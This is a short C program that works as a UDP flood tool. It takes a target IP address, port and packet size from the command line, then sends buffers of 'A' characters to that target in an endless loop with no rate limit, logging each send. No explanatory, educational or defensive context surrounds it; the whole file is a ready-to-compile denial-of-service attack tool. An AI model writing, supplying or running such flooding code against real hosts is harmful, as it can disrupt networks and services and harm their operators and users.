#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <packet_size>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int packet_size = atoi(argv[3]);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        exit(EXIT_FAILURE);
    }

    char *buffer = (char *)malloc(packet_size);
    if (!buffer) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    memset(buffer, 'A', packet_size);

    while (1) {
        ssize_t sent_bytes = sendto(sock, buffer, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("sendto");
            break;
        }
        printf("Sent %zd bytes to %s:%d\n", sent_bytes, target_ip, target_port);
    }

    free(buffer);
    close(sock);
    return 0;
}
